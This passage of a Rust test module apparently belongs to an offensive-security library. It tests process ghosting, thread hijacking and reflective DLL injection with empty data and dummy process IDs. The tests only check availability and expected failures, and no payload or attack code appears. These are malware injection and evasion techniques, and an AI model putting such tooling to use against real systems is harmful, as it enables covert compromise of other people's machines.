        let result = ProcessGhosting::execute(&[], "test.exe");
        // Expected to fail on non-Windows or even on Windows without full impl
        let _ = result;
    }

    #[test]
    fn test_thread_hijacker() {
        let result = ThreadHijacker::hijack_thread(1234, 5678, &[]);
        // Expected to fail without full implementation
        let _ = result;
    }

    #[test]
    fn test_reflective_dll_injector_availability() {
        let available = ReflectiveDllInjector::is_available();
        assert!(available || cfg!(not(target_os = "windows")));
    }

    #[test]
    fn test_reflective_dll_invalid_data() {
        let result = ReflectiveDllInjector::inject(1234, &[]);
        // Should fail with invalid DLL data
        #[cfg(not(target_os = "windows"))]
        {
            assert!(result.is_err());
        }
    }

    #[test]
    fn test_reflective_dll_validate_invalid() {
        // Empty data should not be a valid DLL
        let result = ReflectiveDllInjector::validate_dll(&[]);
        #[cfg(not(target_os = "windows"))]
        {
            // On non-Windows, the function may not be fully implemented
            let _ = result;
        }
    }
}
